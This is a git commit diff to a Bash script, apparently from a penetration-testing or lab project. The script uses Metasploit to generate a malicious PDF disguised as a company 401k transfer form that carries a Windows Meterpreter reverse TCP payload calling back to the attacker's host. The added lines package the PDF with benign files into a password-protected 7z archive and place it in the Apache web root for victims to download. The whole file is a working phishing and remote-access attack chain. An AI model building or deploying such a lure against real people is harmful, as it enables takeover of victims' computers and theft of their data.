bccd9d537ae960ed657e57ca6050d57a6a24e47d
ehsu4220 <31673535+ehsu4220@users.noreply.github.com>
2023-05-06 23:37:23 -0400

    Auto generate and add to Apache2
    Added script to automatically generate the malicious PDF, combine with benign files, and move to the /var/www/html directory, where Apache2 server's files are located.

--- generate_malicious_pdf.sh
+++ generate_malicious_pdf.sh
@@ -1,5 +1,10 @@
 #!/bin/bash
 
+# Get the sudo password from user input
+read -s -p "Enter sudo password: " SUDO_PASS
+echo ""
+
+# Generate the malicious PDF
 msfconsole -q -x \
 "use exploit/windows/fileformat/adobe_pdf_embedded_exe; \
 set FILENAME Company_401k_transfer.pdf; \
@@ -8,5 +13,12 @@ set LAUNCH_MESSAGE Couldn't Open PDF: Something's keeping this PDF from opening;
 set PAYLOAD windows/meterpreter/reverse_tcp; \
 set LHOST "$(hostname -I | cut -d' ' -f1)"; \
 set LPORT 4444; \
-exploit;"
+exploit; \
+exit;"
 
+# Generate the encrypted archive file with the malicious PDF and benign files
+cp -r exit_documents Employee_package
+cp Company_401k_transfer.pdf Employee_package/
+7z a -p"password" Employee_package.7z Employee_package/
+echo "$SUDO_PASS" | sudo -S cp Employee_package.7z /var/www/html
+rm Employee_package.7z
